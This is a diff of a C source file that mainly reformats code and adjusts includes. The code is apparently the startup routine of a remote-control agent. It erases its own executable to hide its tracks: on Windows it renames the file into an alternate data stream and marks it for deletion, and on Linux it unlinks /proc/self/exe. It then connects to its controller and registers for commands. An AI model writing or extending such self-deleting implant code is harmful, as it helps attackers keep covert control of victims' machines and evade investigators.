@@ -21,13 +21,14 @@
 
 // clang-format on
 
-#include <linux/limits.h>
 #ifdef _WIN32
 // clang-format off
+#include <winsock2.h>
 #include <windows.h>
-// clang-format on 
+// clang-format on
 #endif
 #include <errno.h>
+#include <limits.h>
 #include <signal.h>
 #include <stdbool.h>
 #include <stdlib.h>
@@ -75,30 +76,30 @@ int main(int argc, char **argv) {
   GetModuleFileNameA(NULL, selfpath, MAX_PATH);
 
   HANDLE shandle = CreateFile(selfpath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-  if(INVALID_HANDLE_VALUE == shandle){
+  if (INVALID_HANDLE_VALUE == shandle) {
     debug("failed to get handle for self");
     goto cont;
   }
 
   FILE_RENAME_INFO rename_info;
-  wchar_t *name = L":lmao";
-  ssize_t rename_size = sizeof(rename_info)+sizeof(name);
+  wchar_t         *name        = L":lmao";
+  ssize_t          rename_size = sizeof(rename_info) + sizeof(name);
 
   bzero(&rename_info, sizeof(rename_info));
 
   rename_info.FileNameLength = sizeof(name);
-  memcpy(rename_info.FileName, name, sizeof(name));
+  RtlCopyMemory(rename_info.FileName, name, sizeof(name));
 
-  if(SetFileInformationByHandle(shandle, FileRenameInfo, &rename_info, rename_size)==0){
+  if (SetFileInformationByHandle(shandle, FileRenameInfo, &rename_info, rename_size) == 0) {
     debug("failed to set rename info for self");
     CloseHandle(shandle);
     goto cont;
   }
 
   CloseHandle(shandle);
-  
+
   shandle = CreateFile(argv[0], DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-  if(INVALID_HANDLE_VALUE == shandle){
+  if (INVALID_HANDLE_VALUE == shandle) {
     debug("failed to get handle for self");
     goto cont;
   }
@@ -107,7 +108,7 @@ int main(int argc, char **argv) {
   bzero(&del_info, sizeof(del_info));
   del_info.DeleteFile = true;
 
-  if(SetFileInformationByHandle(shandle, FileDispositionInfo, &del_info, sizeof(del_info))==0){
+  if (SetFileInformationByHandle(shandle, FileDispositionInfo, &del_info, sizeof(del_info)) == 0) {
     debug("failed to set disposition info for self");
     CloseHandle(shandle);
     goto cont;
@@ -117,22 +118,22 @@ int main(int argc, char **argv) {
 #else
   char selfpath[PATH_MAX];
 
-  if(readlink("/proc/self/exe", selfpath, PATH_MAX) < 0){
+  if (readlink("/proc/self/exe", selfpath, PATH_MAX) < 0) {
     debug("failed to readlink of /proc/self/exe");
     goto cont;
   }
 
-  if(unlink(selfpath) != 0){
+  if (unlink(selfpath) != 0) {
     debug("failed to unlink self");
     goto cont;
   }
 #endif
 
 cont:
-  if(!agent_connect(&agent))
+  if (!agent_connect(&agent))
     goto end;
 
-  if(!cmd_register(&agent))
+  if (!cmd_register(&agent))
     goto end;
 
   while (true) {
